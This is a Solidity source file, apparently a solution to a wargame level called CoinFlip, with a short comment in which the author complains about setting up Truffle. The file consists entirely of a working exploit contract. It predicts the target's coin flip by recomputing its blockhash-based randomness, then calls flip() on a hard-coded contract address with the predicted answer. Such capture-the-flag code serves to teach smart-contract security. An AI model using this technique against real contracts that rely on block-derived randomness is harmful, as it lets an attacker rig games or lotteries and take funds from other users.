pragma solidity ^0.8.0;

/**
 * The most annoying one of the bunch.
 * Not hard but setting up truffle is a PITA.
 * Learned:
 * - Truffle sucks...
 * - Run `migrations --reset` please.
 * - SafeMath not needed after solidity > 0.8.0
 * */
interface CoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinFlipAttack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function tryFlip() public returns (bool) {
        require(msg.sender == owner);
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        require(CoinFlip(0x72380C4AF2dE9E9f3F037683Bf0e926c9E9D1086).flip(side));
    }
}
